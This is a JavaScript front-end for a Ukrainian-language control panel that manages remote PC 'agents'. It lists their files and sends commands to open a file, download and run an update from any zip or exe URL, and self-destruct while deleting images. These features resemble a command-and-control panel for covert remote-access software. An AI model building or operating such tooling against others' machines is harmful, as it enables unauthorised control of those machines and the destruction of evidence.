const pcsEl = document.getElementById('pcs');
const tpl = document.getElementById('card');

function renderAgents(list){
  pcsEl.innerHTML = '';
  (list||[]).forEach(a=>{
    const node = tpl.content.cloneNode(true);
    const el = node.querySelector('.card');
    el.querySelector('.name').textContent = a.name || a.id;
    el.querySelector('.status').textContent = a.online ? 'Увімкнений' : 'Офлайн';
    const sel = el.querySelector('.files');
    sel.innerHTML = '';
    (a.files||[]).forEach(f=>{
      const o = document.createElement('option');
      o.value = f; o.textContent = f; sel.appendChild(o);
    });
    if((a.files||[]).length===0){
      const o = document.createElement('option'); o.textContent = 'Файлів немає'; sel.appendChild(o);
    }
    const msg = el.querySelector('.msg');
    el.querySelector('.open').addEventListener('click', async ()=>{
      msg.textContent = 'Виконую...';
      try{
        const file = sel.value;
        const r = await fetch(`/api/agents/${encodeURIComponent(a.id)}/open`, {
          method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ file })
        });
        const j = await r.json();
        if(r.ok && j.ok) msg.textContent = 'Команда відправлена';
        else msg.textContent = 'Помилка: ' + (j.error || JSON.stringify(j));
      }catch(e){ msg.textContent = 'Помилка мережі: ' + e.message; }
    });
    el.querySelector('.update').addEventListener('click', async ()=>{
      const url = prompt('Вкажіть URL для апдейту (zip або exe):');
      if(!url) return;
      msg.textContent = 'Надсилаю апдейт...';
      try{
        const r = await fetch(`/api/agents/${encodeURIComponent(a.id)}/update`, {
          method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ url })
        });
        const j = await r.json();
        msg.textContent = (j.ok ? 'АПДЕЙТ ініційовано' : ('Помилка: '+(j.error||JSON.stringify(j))));
      }catch(e){ msg.textContent = 'Помилка мережі: ' + e.message; }
    });
    el.querySelector('.self').addEventListener('click', async ()=>{
      if(!confirm('Ви впевнені? Агент видалить себе і картинки.')) return;
      msg.textContent = 'Надсилаю команду самознищення...';
      try{
        const r = await fetch(`/api/agents/${encodeURIComponent(a.id)}/selfdestruct`, { method:'POST' });
        const j = await r.json();
        msg.textContent = (j.ok ? 'Самознищення ініційоване' : ('Помилка: '+(j.error||JSON.stringify(j))));
      }catch(e){ msg.textContent = 'Помилка мережі: ' + e.message; }
    });

    pcsEl.appendChild(node);
  });
}

// SSE connection
const evt = new EventSource('/events');
evt.addEventListener('agents', e=>{
  try{
    const data = JSON.parse(e.data);
    // server provides array
    const list = data.map(a=>{
      const online = (Date.now() - (a.lastSeen || 0)) < 90_000;
      return { id: a.id, name: a.name, files: a.files || [], lastSeen: a.lastSeen, online };
    });
    renderAgents(list);
  }catch(e){}
});
evt.onerror = (err)=> {
  console.warn('SSE error', err);
  // fallback to polling
  fetch('/api/agents').then(r=>r.json()).then(renderAgents).catch(()=>{});
};
